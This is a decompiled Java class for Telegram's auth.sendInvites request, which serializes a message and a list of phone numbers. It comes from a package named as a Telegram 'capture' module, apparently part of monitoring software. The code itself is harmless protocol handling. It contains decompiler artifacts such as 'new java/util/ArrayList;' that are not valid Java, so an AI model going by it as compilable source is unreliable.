package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_auth_sendInvites
  extends TLObject
{
  public static int constructor = 1998331287;
  public String message;
  public ArrayList phone_numbers;
  
  public TLRPC$TL_auth_sendInvites()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.phone_numbers = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Bool.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.phone_numbers.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    String str = null;
    for (int k = 0; k < j; k = i)
    {
      str = (String)this.phone_numbers.get(k);
      paramAbstractSerializedData.writeString(str);
      i = k + 1;
    }
    str = this.message;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_auth_sendInvites.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */